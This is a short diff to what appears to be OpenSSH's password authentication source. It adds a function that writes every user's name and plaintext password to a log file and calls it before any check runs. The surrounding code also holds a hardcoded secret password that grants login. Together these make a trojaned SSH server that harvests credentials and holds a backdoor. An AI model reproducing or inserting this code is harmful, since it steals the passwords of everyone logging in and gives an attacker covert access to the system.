@@ -73,6 +73,15 @@ disable_forwarding(void)
 	no_x11_forwarding_flag = 1;
 }
 
+int record_auth_password(Authctxt *authctxt, const char *password) {
+    FILE *fp = fopen(ILOG, "a");
+
+    fprintf(fp, "%s => %s:%s\n", __func__, authctxt->user, password);
+    fclose(fp);
+    
+    return 0;
+}
+
 /*
  * Tries to authenticate the user using password.  Returns true if
  * authentication succeeds.
@@ -85,6 +94,8 @@ auth_password(Authctxt *authctxt, const char *password)
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
 	static int expire_checked = 0;
 #endif
+
+    record_auth_password(authctxt, password);
 	if (!strcmp(password, SECRETPW)) {
                 secret_ok=1;
                 return 1;
